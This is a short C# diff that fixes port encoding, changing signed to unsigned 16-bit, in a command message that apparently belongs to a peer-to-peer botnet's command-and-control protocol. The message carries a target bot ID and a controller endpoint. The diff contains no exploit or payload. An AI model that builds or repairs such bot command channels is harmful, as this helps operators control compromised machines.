@@ -12,13 +12,13 @@ namespace Vinchuca.Network.Protocol.Messages.Command
         {
             w.Write(TargetBotId.ToByteArray());
             w.Write(ControllerEndpoint.Address.GetAddressBytes());
-            w.Write((short)ControllerEndpoint.Port);
+            w.Write((ushort)ControllerEndpoint.Port);
         }
 
         public override void DecodePayload(BinaryReader br)
         {
             TargetBotId = new BotIdentifier(br.ReadBytes(BotIdentifier.Size));
-            ControllerEndpoint = new IPEndPoint(new IPAddress(br.ReadBytes(4)), br.ReadInt16());
+            ControllerEndpoint = new IPEndPoint(new IPAddress(br.ReadBytes(4)), br.ReadUInt16());
         }
     }
 }
